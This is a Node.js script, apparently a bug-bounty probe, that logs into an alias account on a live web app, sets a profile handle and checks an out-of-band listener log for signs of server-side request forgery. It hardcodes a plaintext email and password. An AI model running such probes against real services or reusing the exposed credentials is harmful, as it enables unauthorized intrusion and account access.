import fs from "fs";
const APP="https://aarme.cyberaar.io";
const UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const TUN=fs.readFileSync("/tmp/opencode/cyberaar/tunnel-url.txt","utf8").trim();
const {writeFileSync}=await import("node:fs");
let COOKIE="";
const H=(extra={})=>({"Content-Type":"application/json",Accept:"application/json","User-Agent":UA,Origin:APP,Referer:APP+"/compte/",...(COOKIE?{Cookie:COOKIE}:{}),...extra});
async function req(path,o={}){for(let i=0;i<6;i++){try{const t0=Date.now();const r=await fetch(APP+path,{method:o.m||"GET",headers:o.m?H():{Accept:"application/json","User-Agent":UA,Origin:APP,...(COOKIE?{Cookie:COOKIE}:{})},body:o.body,redirect:"manual",signal:AbortSignal.timeout(25000)});const t=await r.text();const ck=r.headers.getSetCookie?.()||[];if(ck.length)COOKIE=ck.map(c=>c.split(";")[0]).join("; ");return{s:r.status,ms:Date.now()-t0,txt:t};}catch(e){await new Promise(x=>setTimeout(x,3000));}}return{s:0,ms:0,txt:"ERR "+"timeout"};}
const show=(l,r)=>console.log("  "+l.padEnd(46)+"HTTP "+r.s+" "+String(r.ms).padStart(5)+"ms  "+r.txt.replace(/\s+/g," ").slice(0,220));
console.log("=== 1) connexion au compte alias (cree a l inscription) ===");
show("POST /login",await req("/api/aarme/account/login",{m:"POST",body:JSON.stringify({email:"vianney24lechancelier+bb1@gmail.com",password:"Bb-test-2026-ok!"})}));
console.log("  cookie : "+(COOKIE||"(aucun)"));
if(!COOKIE) process.exit(1);
writeFileSync("/tmp/opencode/cyberaar/session-alias.txt",COOKIE+"\n");
await new Promise(r=>setTimeout(r,2000));
show("GET /account/me",await req("/api/aarme/account/me"));
await new Promise(r=>setTimeout(r,2000));
console.log("\n=== 2) je donne un pseudo -> le profil public existe -> le serveur fetch-t-il l URL ? ===");
show("PATCH /account/profile {handle}",await req("/api/aarme/account/profile",{m:"PATCH",body:JSON.stringify({handle:"bb-probe-ssrf",display_name:"bb probe",country:"BJ"})}));
await new Promise(r=>setTimeout(r,3000));
const pub=await fetch("https://aarme.cyberaar.io/h/bb-probe-ssrf",{headers:{"User-Agent":UA},redirect:"manual"});
const pt=await pub.text();
console.log("  GET /h/bb-probe-ssrf -> HTTP "+pub.status+" ("+pt.length+" car.)");
const inPage=pt.includes("ssrf-registration-probe");
console.log("  l URL du profil est-elle reprise dans la page ? "+(inPage?"OUI":"non"));
if(inPage){ const i=pt.indexOf("ssrf-registration-probe"); console.log("  extrait : "+pt.slice(Math.max(0,i-200),i+160).replace(/\s+/g," ")); }
console.log("  CSP : "+(pub.headers.get("content-security-policy")||"(aucune)").slice(0,240));
await new Promise(r=>setTimeout(r,3000));
console.log("\n  --- PREUVE OOB (le serveur a-t-il telecharge l URL du profil ?) ---");
try{ console.log(fs.readFileSync("/tmp/opencode/cyberaar/probe-listener.log","utf8").trim().split("\n").slice(-5).join("\n")); }catch{ console.log("  (aucune)"); }
